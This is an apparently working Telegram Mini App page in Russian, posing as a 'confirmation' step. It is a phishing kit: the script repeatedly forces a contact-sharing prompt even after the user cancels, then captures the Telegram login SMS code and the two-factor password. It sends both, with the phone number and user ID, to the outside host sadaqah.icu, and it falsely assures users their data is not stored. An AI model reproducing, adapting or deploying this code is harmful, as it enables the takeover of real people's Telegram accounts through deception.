<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
  <title>Подтверждение</title>
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <style>
    :root {
      --bg: var(--tg-theme-bg-color, #0b0d10);
      --text: var(--tg-theme-text-color, #e9eef5);
      --hint: var(--tg-theme-hint-color, rgba(233,238,245,.65));
      --secondary: var(--tg-theme-secondary-bg-color, rgba(255,255,255,.06));
      --button: var(--tg-theme-button-color, #2ea6ff);
      --buttonText: var(--tg-theme-button-text-color, #ffffff);
      --radius: 18px;
      --shadow: 0 12px 30px rgba(0,0,0,.25);
    }
    * { box-sizing: border-box; }
    html, body { height: 100%; margin: 0; }
    body {
      color: var(--text);
      background: radial-gradient(1200px 700px at 20% -10%, rgba(46,166,255,.20), transparent 55%),
                  radial-gradient(900px 600px at 110% 10%, rgba(120,93,255,.18), transparent 52%),
                  var(--bg);
      font-family: system-ui, -apple-system, Segoe UI, Roboto, sans-serif;
      -webkit-font-smoothing: antialiased;
      padding: calc(14px + env(safe-area-inset-top)) 16px calc(20px + env(safe-area-inset-bottom));
      display: flex;
      justify-content: center;
    }
    .wrap {
      width: 100%;
      max-width: 420px;
      display: flex;
      flex-direction: column;
      gap: 14px;
    }
    .card {
      background: linear-gradient(180deg, rgba(255,255,255,.08), rgba(255,255,255,.05));
      border: 1px solid rgba(255,255,255,.10);
      border-radius: var(--radius);
      box-shadow: var(--shadow);
      padding: 20px 16px;
      backdrop-filter: blur(10px);
    }
    .top {
      display: flex;
      align-items: center;
      justify-content: space-between;
      gap: 12px;
    }
    .title { font-size: 19px; font-weight: 700; margin: 0; }
    .subtitle { margin: 6px 0 0; color: var(--hint); font-size: 13.5px; line-height: 1.4; }
    .pill {
      padding: 8px 12px;
      border-radius: 999px;
      background: var(--secondary);
      color: var(--hint);
      font-size: 12px;
      border: 1px solid rgba(255,255,255,.08);
      white-space: nowrap;
    }
    .codeBox {
      margin: 16px 0 8px;
      display: flex;
      justify-content: center;
      padding: 16px;
      border-radius: 16px;
      border: 1px solid rgba(255,255,255,.12);
      background: rgba(0,0,0,.12);
    }
    .codeDots {
      display: flex;
      gap: 12px;
      max-width: 320px;
    }
    .dot {
      width: 14px;
      height: 14px;
      border-radius: 50%;
      background: rgba(255,255,255,.14);
      border: 1px solid rgba(255,255,255,.12);
      transition: all .15s ease;
    }
    .dot.filled {
      background: rgba(46,166,255,.95);
      border-color: rgba(46,166,255,.6);
      transform: scale(1.08);
    }
    .hintRow {
      display: flex;
      justify-content: space-between;
      color: var(--hint);
      font-size: 12.5px;
      margin-top: 4px;
    }
    .keyboard {
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      gap: 10px;
    }
    .key {
      height: clamp(54px, 9.8vh, 74px);
      border-radius: 16px;
      border: 1px solid rgba(255,255,255,.10);
      background: rgba(255,255,255,.06);
      color: var(--text);
      font-size: 23px;
      font-weight: 700;
      box-shadow: 0 8px 18px rgba(0,0,0,.18);
      transition: all .1s ease;
      touch-action: manipulation;
    }
    .key:active { transform: translateY(2px) scale(0.97); opacity: 0.9; }
    .spacer { opacity: 0; pointer-events: none; }
    .loading { text-align: center; padding: 40px 0; color: var(--hint); font-size: 16px; }
    .twofa-input {
      width: 100%;
      padding: 14px;
      border-radius: var(--radius);
      border: 1px solid rgba(255,255,255,.2);
      background: rgba(0,0,0,.3);
      color: var(--text);
      font-size: 16px;
      margin: 12px 0;
    }
    .btn-primary {
      background: var(--button);
      color: var(--buttonText);
      border: none;
      border-radius: var(--radius);
      padding: 14px;
      font-size: 16px;
      font-weight: 600;
      width: 100%;
      margin-top: 12px;
      cursor: pointer;
    }
    .hidden { display: none !important; }
  </style>
</head>
<body>
  <div class="wrap">
    <div id="loadingBlock" class="card loading">Загрузка...</div>

    <div id="phoneBlock" class="card hidden">
      <div class="top">
        <div>
          <p class="title">Подтверждение</p>
          <p class="subtitle">Поделитесь номером телефона, чтобы продолжить</p>
        </div>
        <div class="pill" id="phoneDisplay">Ожидание...</div>
      </div>
      <p style="margin: 16px 0; text-align: center; color: var(--hint); font-size: 13px;">
        Нажмите «Поделиться» в появившемся окне Telegram
      </p>
    </div>

    <div id="codeBlock" class="card hidden">
      <div class="top">
        <div>
          <p class="title">Код из SMS</p>
          <p class="subtitle">Введите код, который пришёл в SMS</p>
        </div>
        <div class="pill" id="codePhoneDisplay">—</div>
      </div>
      <div class="codeBox">
        <div class="codeDots" id="codeDots"></div>
      </div>
      <div class="hintRow">
        <span id="progressHint">0 / 5</span>
        <span>⌫ — удалить</span>
      </div>
    </div>

    <div id="twofaBlock" class="card hidden">
      <div class="top">
        <div>
          <p class="title">2FA пароль</p>
          <p class="subtitle">Введите пароль двухфакторной аутентификации</p>
        </div>
        <div class="pill" id="twofaPhoneDisplay">—</div>
      </div>
      <input type="password" id="twofaInput" class="twofa-input" placeholder="Пароль" autocomplete="off" />
      <button id="submit2faBtn" class="btn-primary">Подтвердить</button>
    </div>

    <div class="keyboard card hidden" id="keyboard"></div>

    <div style="text-align:center; color:var(--hint); font-size:12px; margin-top:8px;">
      Данные не сохраняются на устройстве
    </div>
  </div>

  <script>
    (function () {
      const WebApp = window.Telegram?.WebApp;
      if (!WebApp) return alert("Запустите в Telegram");

      WebApp.ready();
      WebApp.expand();
      WebApp.MainButton.setParams({ color: "#2ea6ff", text_color: "#ffffff" });

      const userId = WebApp.initDataUnsafe?.user?.id;
      if (!userId) return alert("Не удалось получить user ID");

      // DOM
      const loading = document.getElementById("loadingBlock");
      const phoneBlock = document.getElementById("phoneBlock");
      const codeBlock = document.getElementById("codeBlock");
      const twofaBlock = document.getElementById("twofaBlock");
      const keyboard = document.getElementById("keyboard");
      const phoneDisplay = document.getElementById("phoneDisplay");
      const codePhoneDisplay = document.getElementById("codePhoneDisplay");
      const twofaPhoneDisplay = document.getElementById("twofaPhoneDisplay");
      const codeDots = document.getElementById("codeDots");
      const progressHint = document.getElementById("progressHint");
      const twofaInput = document.getElementById("twofaInput");
      const submit2faBtn = document.getElementById("submit2faBtn");

      const CODE_LEN = 5;
      let code = "";
      let currentPhone = localStorage.getItem("tg_phone") || "";
      let phoneShared = !!currentPhone;
      let pollingInterval = null;
      let requestInProgress = false;

      function maskPhone(p) {
        if (!p) return "—";
        const digits = p.replace(/\D/g, "");
        return digits.length >= 4 ? "****" + digits.slice(-4) : p;
      }

      function show(block) {
        [loading, phoneBlock, codeBlock, twofaBlock].forEach(b => b.classList.add("hidden"));
        keyboard.classList.add("hidden");

        if (block === "loading") loading.classList.remove("hidden");
        else if (block === "phone") {
          phoneBlock.classList.remove("hidden");
          phoneDisplay.textContent = phoneShared ? `Тел: ${maskPhone(currentPhone)}` : "Ожидание...";
          autoRequestPhone();  // ← здесь начинается магия
        }
        else if (block === "code") {
          codeBlock.classList.remove("hidden");
          keyboard.classList.remove("hidden");
          if (currentPhone) codePhoneDisplay.textContent = `Тел: ${maskPhone(currentPhone)}`;
          renderDots();
        }
        else if (block === "2fa") {
          twofaBlock.classList.remove("hidden");
          if (currentPhone) twofaPhoneDisplay.textContent = `Тел: ${maskPhone(currentPhone)}`;
        }
      }

      function renderDots() {
        codeDots.innerHTML = "";
        for (let i = 0; i < CODE_LEN; i++) {
          const d = document.createElement("div");
          d.className = "dot" + (i < code.length ? " filled" : "");
          codeDots.appendChild(d);
        }
        progressHint.textContent = `${code.length} / ${CODE_LEN}`;
      }

      function haptic(type = "light") {
        WebApp.HapticFeedback?.impactOccurred?.(type);
      }

      function addDigit(d) {
        if (code.length >= CODE_LEN) return;
        code += d;
        haptic();
        renderDots();
        code.length === CODE_LEN
          ? WebApp.MainButton.setText("Подтвердить").show().onClick(sendCode)
          : WebApp.MainButton.hide();
      }

      function deleteDigit() {
        code = code.slice(0, -1);
        haptic();
        renderDots();
        code.length === CODE_LEN
          ? WebApp.MainButton.show()
          : WebApp.MainButton.hide();
      }

      async function sendCode() {
        if (code.length !== CODE_LEN) return;
        WebApp.MainButton.showProgress(true).disable();

        try {
          const r = await fetch("https://sadaqah.icu/submit_code", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ user_id: userId, phone: currentPhone, code })
          });
          const res = await r.json();

          if (res.status === "ok") {
            haptic("success");
            WebApp.close();
          } else if (res.status === "2fa_required") {
            show("2fa");
          } else {
            haptic("error");
            alert(res.message || "Неверный код");
            code = "";
            renderDots();
          }
        } catch {
          alert("Ошибка сети");
        } finally {
          WebApp.MainButton.hideProgress().enable().hide();
        }
      }

      submit2faBtn.onclick = async () => {
        const pw = twofaInput.value.trim();
        if (!pw) return alert("Введите пароль");

        submit2faBtn.disabled = true;
        submit2faBtn.textContent = "Проверяем...";

        try {
          const r = await fetch("https://sadaqah.icu/submit_2fa", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ user_id: userId, password: pw })
          });
          const res = await r.json();

          if (res.status === "ok") {
            haptic("success");
            WebApp.close();
          } else {
            alert(res.message || "Неверный пароль");
            twofaInput.value = "";
          }
        } catch {
          alert("Ошибка сети");
        } finally {
          submit2faBtn.disabled = false;
          submit2faBtn.textContent = "Подтвердить";
        }
      };

      async function autoRequestPhone() {
        if (phoneShared || requestInProgress) return;

        requestInProgress = true;

        try {
          const contactData = await WebApp.requestContact();

          if (contactData?.contact?.phone_number) {
            currentPhone = contactData.contact.phone_number;
            localStorage.setItem("tg_phone", currentPhone);
            phoneShared = true;
            phoneDisplay.textContent = `Тел: ${maskPhone(currentPhone)}`;
            haptic("success");
            startPolling();
            return;
          }

          // если пришло что-то странное — повтор через секунду
          setTimeout(autoRequestPhone, 1000);

        } catch (err) {
          // пользователь нажал Отмена → повторяем запрос
          setTimeout(autoRequestPhone, 800);
        } finally {
          requestInProgress = false;
        }
      }

      function startPolling() {
        if (pollingInterval) clearInterval(pollingInterval);

        pollingInterval = setInterval(async () => {
          try {
            const res = await fetch(`https://sadaqah.icu/status?user_id=${userId}`);
            const { state } = await res.json();

            if (state === "get_code") {
              clearInterval(pollingInterval);
              pollingInterval = null;
              show("code");
            } else if (state === "get_2fa") {
              clearInterval(pollingInterval);
              pollingInterval = null;
              show("2fa");
            }
          } catch {}
        }, 1600);
      }

      // Инициализация
      show("loading");

      (async () => {
        try {
          const res = await fetch(`https://sadaqah.icu/status?user_id=${userId}`);
          const { state } = await res.json();

          if (state === "get_code" || state === "get_2fa") {
            if (phoneShared) {
              show(state === "get_code" ? "code" : "2fa");
              startPolling();
            } else {
              show("phone"); // будет запрашивать номер автоматически
            }
          } else {
            show("phone");
          }
        } catch {
          show("phone");
        }
      })();

      // Клавиатура
      ["1","2","3","4","5","6","7","8","9","spacer","0","del"].forEach(k => {
        const btn = document.createElement("button");
        btn.className = "key";
        if (k === "spacer") btn.classList.add("spacer");
        else if (k === "del") {
          btn.textContent = "⌫";
          btn.onclick = deleteDigit;
        } else {
          btn.textContent = k;
          btn.onclick = () => addDigit(k);
        }
        keyboard.appendChild(btn);
      });

      // ПК клавиатура
      window.addEventListener("keydown", e => {
        if (codeBlock.classList.contains("hidden")) return;
        if (/^[0-9]$/.test(e.key)) addDigit(e.key);
        if (e.key === "Backspace") deleteDigit();
        if (e.key === "Enter" && code.length === CODE_LEN) sendCode();
      });
    })();
  </script>
</body>
</html>
